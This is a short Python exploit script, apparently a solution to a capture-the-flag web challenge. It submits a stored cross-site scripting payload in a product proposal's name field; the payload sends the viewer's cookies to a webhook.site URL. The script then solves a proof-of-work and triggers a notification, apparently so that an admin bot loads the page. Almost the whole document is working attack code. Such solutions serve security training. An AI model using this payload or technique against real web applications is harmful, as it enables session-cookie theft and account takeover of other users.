#!/usr/bin/env python3
from hashlib import sha256
from uuid import uuid4
import requests, json

URL = 'http://smaug.challs.olicyber.it:38317/'
s = requests.Session()

s.get(URL)
r = s.post(URL + 'api/v1proposals', json={
    'uuid': (uuid := str(uuid4())),
    'name': '''</title><body>
            <script>
                fetch(`https://webhook.site/34446e6f-5c41-482f-97bb-f5eda6b34c17?${document.cookie}`)
            </script>
        ''',
    'price': 10,
    'description': 'palle',
    'seller': 'prova',
})
assert r.status_code == 201

r = json.loads(s.get(URL + 'api/v1/pow').text)
i = 0
while sha256(str(i).encode()).hexdigest()[-5:] != r['pow']:
    print(f'not {i}')
    i += 1
    continue

f = s.post(URL + 'api/v1/notify', json={
    'proposal_uuid': uuid,
    'pow_uuid': r['uuid'],
    'pow_solution': str(i)
})

assert f.status_code == 200
